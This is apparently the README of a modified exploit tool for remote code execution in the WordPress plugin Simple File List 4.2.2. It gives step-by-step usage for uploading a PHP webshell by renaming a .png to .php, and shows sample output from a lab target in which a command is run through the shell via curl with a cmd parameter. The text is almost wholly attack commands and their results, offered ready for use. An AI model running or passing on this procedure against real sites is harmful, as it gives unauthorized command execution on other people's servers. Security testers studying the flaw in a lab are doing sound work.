# Wordpress-Plugin-Simple-File-List-4.2.2---Remote-Code-Execution
Modified version of original exploit by coiffeur to add a php webshell for vulnerable Wordpress plugin: Simple File List 4.2.2

## Usage
1. Uploading the webshell

```bash
python exploit.py <url>
```
2. Execute RCE via uploaded webshell via GET request on target

```bash
curl <given url path to webshell>?cmd=<command to run on target>
```


## Example

```bash
└─$ python my_exploit.py http://192.168.229.105                                        
[ ] File 2383.png
[ ] File uploaded at http://192.168.229.105/wp-content/uploads/simple-file-list/2383.png
[ ] File moved to http://192.168.229.105/wp-content/uploads/simple-file-list/2383.php
[+] Exploit seem to work.
[+] GET request for RCE via php webshell: http://192.168.229.105/wp-content/uploads/simple-file-list/2383.php?cmd=<command to run on target>
                                                                                                                                                                                                                                             
....                                                                                                                                                                                                                                             
└─$ curl http://192.168.229.105/wp-content/uploads/simple-file-list/2383.php?cmd=whoami
http
                                                       
```
